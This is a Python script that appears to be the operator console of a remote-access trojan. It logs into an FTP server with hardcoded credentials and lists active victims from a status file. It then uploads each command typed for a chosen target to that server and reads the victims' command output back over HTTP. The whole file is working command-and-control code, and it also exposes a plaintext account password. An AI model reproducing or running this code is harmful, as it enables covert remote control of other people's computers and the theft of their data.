def main():
    ftp=ftplib.FTP('hecta.125mb.com')
    ftp.login("2336040_opon","Black11060")
    #ftp.cwd('hecta.125mb.com')
    x=0
    gotten_time=urlopen('http://hecta.125mb.com/last_seen.txt')
    for xc in gotten_time:
        xc=xc.strip()
        xc=str(xc.decode("utf-8"))
        print("active @ "+ xc)
    
    target=input("target:")
    while True:
        x+=1
        command=input("["+str(x)+"] :")
        with open(target,'w') as tar:
            tar.write(command)
            
        file_to_send=open(target,"rb")
        ftp.storlines('STOR '+target,file_to_send)
        time.sleep(3)
        gotten_output=urlopen('http://hecta.125mb.com/output.txt')
        for xy in gotten_output:
            xy=xy.strip()
            xy=str(xy.decode('cp866', errors='replace'))
            print(xy)
    
if __name__=='__main__':
    import ftplib
    import time
    import urllib
    from urllib.request import urlopen
    while True:
        try:
            main()
        except Exception as drt:
            print(drt)
